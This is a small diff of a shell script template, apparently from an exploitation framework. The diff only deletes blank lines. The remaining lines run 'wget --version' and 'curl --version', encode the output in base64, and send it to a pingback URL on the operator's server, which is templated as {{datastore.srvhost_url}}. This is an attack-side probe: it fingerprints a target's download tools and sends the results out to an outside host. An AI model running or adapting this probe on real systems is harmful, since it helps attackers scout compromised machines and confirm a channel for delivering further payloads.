@@ -1,7 +1,5 @@
 #!/bin/sh
 
-
-
 wget {{datastore.srvhost_url}}debug/pingback?value=$(wget --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#') -O /dev/null
 curl {{datastore.srvhost_url}}debug/pingback?value=$(curl --version 2>&1 | base64 -w 0 | sed -e 's/+/%2B/' -e 's#/#%2F#') -O /dev/null
 
